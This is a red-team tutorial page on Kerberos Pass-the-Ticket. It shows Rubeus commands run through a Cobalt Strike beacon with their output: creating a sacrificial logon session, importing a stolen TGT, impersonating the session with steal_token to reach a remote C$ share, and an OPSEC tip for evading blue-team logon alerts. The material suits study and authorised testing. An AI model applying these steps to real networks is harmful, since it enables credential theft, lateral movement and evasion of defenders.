# Pass The Ticket (PTT)

## Pass The Ticket

Pass The Ticket is a technique where you steal a Kerberos Ticket-granting Ticket (TGT) from a user and use it to impersonate that user.

#### <mark style="color:red;">Note</mark>: Requires Elevated Privileges

## Create Sacrificial Logon session - Rubeus

First step is to create a blank logon session that we can pass the TGT to. This is because a logon session can only hold one TGT at a time.

Rubeus' createnetonly will start a new hidden process (passed as argument in this case cmd.exe) using[CreateProcessWithLogonW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) API.

```powershell
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : False
[*] Username        : GJB9A2GP
[*] Domain          : VPY1XQRP
[*] Password        : R4ABN1K3
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4748
[+] LUID            : 0x798c2c
```

This creates a new locally unique identifier (LUID)

## Pass TGT to new LUID&#x20;

Next we want to pass the TGT we harvested into the new LUID we created in the previous step.

```powershell
beacon> execute-assembly C:\Tools\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

[*] Action: Import Ticket
[*] Target LUID: 0x798c2c
[+] Ticket successfully imported!
```

Rubeus `triage` will now show the users TGT inside this LUID.

## Impersonate the Process created with createnetonly

The final step is to impersonate the process we created using Rubeus' `createnetonly` command. We can do so using the process ID.

```powershell
beacon> steal_token 4748

beacon> ls \\internal-website.rotta.dev\c$
[*] Listing: \\internal-website.rotta.dev\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2024 11:30:11   $Recycle.Bin
          dir     08/10/2024 11:45:28   $WinREAgent
```

## Drop Impersonation

```powershell
beacon> rev2self
beacon> kill 4748
```

## OPSEC

By default Rubeus uses a random username, domain, and password with CreateProcessWithLogonW API. The "Suspicious Logon Events" saved search will show 4624's and the value will be noticeable by blue team as it is not expected.

We can pass our own values like so:

```powershell
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe 
/domain:dev.rotta.dev /username:robert /password:Password123!
```

\
